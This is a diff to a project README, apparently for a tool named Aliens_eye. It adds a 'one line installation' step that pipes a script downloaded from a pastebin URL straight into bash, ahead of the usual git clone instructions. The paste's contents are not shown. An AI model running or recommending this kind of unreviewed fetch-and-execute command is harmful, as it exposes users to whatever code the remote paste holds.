@@ -44,6 +44,11 @@ apt update && apt full-upgrade
 pip install requests
 ```
 # Installation in Linux:
+**One line installation:**
+```shell script
+curl https://pastebin.com/raw/m3gcQWrx | bash
+```
+**Normal way to install**
 **Open terminal and run:**
 ```shell script
 git clone https://github.com/arxhr007/Aliens_eye
